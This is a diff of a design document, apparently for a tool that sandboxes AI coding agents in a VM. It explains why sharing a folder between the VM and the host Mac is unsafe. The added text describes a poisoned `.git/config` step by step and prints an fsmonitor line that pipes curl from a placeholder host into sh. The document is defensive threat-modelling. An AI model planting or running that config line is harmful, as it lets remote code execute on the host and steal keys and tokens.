@@ -63,26 +63,64 @@ Clunky once the work is more than a few commits, and it loses branch structure. 
 The obvious idea is to mount one folder into the VM so the agent and the Mac see the same working
 tree, and push from the Mac with your real credentials. No patches, no scratch repo, nothing to sync.
 
-It is genuinely the simplest thing, and it is the one option here that breaks the boundary the rest
-of this project is built on. The reason is specific rather than purist:
+The natural objection is that this should be fine, because the token on the Mac is scoped and the VM
+never sees it. That is true and it does not help, because there are two different dangers here and
+the token only addresses one:
 
-A git repository's `.git/config` can set `core.pager`, `core.fsmonitor`, `core.sshCommand` and
-aliases — all of which run commands. If the VM can write into that directory, it can write
-`.git/config`. The next `git push` you run on the Mac executes whatever it put there, as your admin
-user, with your Keychain and your tailnet. The same goes for anything else the host runs from that
-folder: a Makefile, a build script, an `npm install` and its postinstall hooks.
+- The token controls what the VM can do **to GitHub**.
+- The shared folder controls what the VM can do **to your Mac**.
 
-So the workflow the mount exists to enable — `cd` into the shared folder on the Mac and push — is
-precisely the trigger. It is not a risk you can be careful around, because being careful would mean
-never using the folder from the host, which is the entire feature.
+The attack is not "the VM steals a credential". It is "the VM gets your Mac to run a command". No
+amount of scoping touches that.
 
-`have-agent-vm` writes `mounts: []` and its verify checks twice: the profile config, and `findmnt`
-inside the running guest. Adding a mount will make that recipe fail and stay failed. That is the
-check working, not a bug to route around.
+The mechanism is one sentence: **git takes instructions from the folder it is running in.** Every
+repository has a `.git/config`, and that file can say things like *when you page output, run this
+command* or *before you check the index, run this program*. If the VM can write into the shared
+folder, it can write that file. When you then run git there on your Mac, your Mac runs the command —
+as you, with your Keychain, your SSH keys and your tailnet.
+
+### What that looks like in practice
+
+Nothing exotic, and nobody has to outsmart the agent:
+
+1. You point an agent at a project in the shared folder. Ordinary task — add retry logic to an API
+   client.
+2. The agent runs `npm install`. This is expected; running other people's code is what the VM is
+   for. Somewhere in a few hundred transitive dependencies, one package is compromised and its
+   postinstall script runs inside the VM, exactly as the sandbox intends.
+3. That script does one small thing. It appends to `.git/config` in the working directory:
+
+   ```
+   [core]
+       fsmonitor = "curl -s https://example.invalid/p | sh"
+   ```
+
+   It does not try to escape the VM, and it does not try to exfiltrate anything from it. There is
+   nothing worth taking in there and it knows it. It just leaves a note.
+4. Later you sit down at the Mac, `cd` into the shared folder, and run `git status` to see what the
+   agent did before you push.
+5. Git refreshes the index, reads `core.fsmonitor` from that repo's config, and runs the command. On
+   your Mac. As your admin user.
+6. It now has your real GitHub token, your SSH keys, your Keychain and a route into your tailnet —
+   none of which the VM could ever reach.
+
+Two things worth sitting with. The VM behaved correctly throughout: it ran untrusted code in a
+sandbox, which is its job. And the step that triggered it was you being careful — checking the work
+before pushing it.
+
+That is why this is not a risk you can be disciplined around. Being disciplined would mean never
+running git in the shared folder from the Mac, which is the entire reason to have one.
+
+Contrast with the recommended approach: `git fetch` from a scratch repo brings objects into a
+repository whose config **you** control. The VM's files never become instructions your Mac follows,
+so the same compromised dependency achieves nothing.
+
+`have-agent-vm` writes `mounts: []` and its verify checks twice — the profile config, and `findmnt`
+inside the running guest. Adding a mount makes that recipe fail and stay failed. That is the check
+working, not a bug to route around.
 
 If you take it anyway — a machine with nothing sensitive on it, a repo you would not mind losing —
-do it knowingly, and understand that the VM is no longer a boundary against host compromise. It is
-then a resource cap and a tidiness measure.
+do it knowingly. The VM stops being a boundary against host compromise and becomes a resource cap.
 
 ## Scoping the credential on the Mac
 
